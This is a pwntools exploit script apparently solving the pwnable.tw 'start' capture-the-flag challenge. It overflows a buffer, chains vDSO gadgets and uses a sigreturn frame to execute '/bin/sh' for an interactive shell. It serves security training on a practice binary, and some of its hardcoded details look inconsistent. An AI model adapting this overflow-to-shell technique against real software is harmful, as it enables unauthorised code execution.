#filename:exp_frame_no_aslr.py
#author:reshahar
from pwn import *

p = process('./start')

p = remote('chall.pwnable.tw',10000)

#p = remote('127.0.0.1',7777)
#0xf7ffd000 0xf7ffe000

vdso = 0xf7ffd000

gad0 = vdso + 0x00000c01    #0x00000c01 : pop edx ; pop ecx ; ret
gad1 = vdso + 0x00000bd1    #0x00000bd1 : mov eax, 0x77 ; int 0x80

reread = 0x08048095 

context.clear()

frame = SigreturnFrame(kernel='amd64')
frame.eax = 11
frame.ebx = 0xffffd560
frame.esp = 0xdeadbeef
frame.eip = 0x0804808f


payload1 = 'A'*20+p32(gad0)+p32(0xff)+p32(0xffffd50c)+p32(reread)+'B'*24  #buffer is little 
payload2 = p32(gad1)+str(frame)+'/bin/sh\x00'

p.send(payload1+payload2)

p.interactive()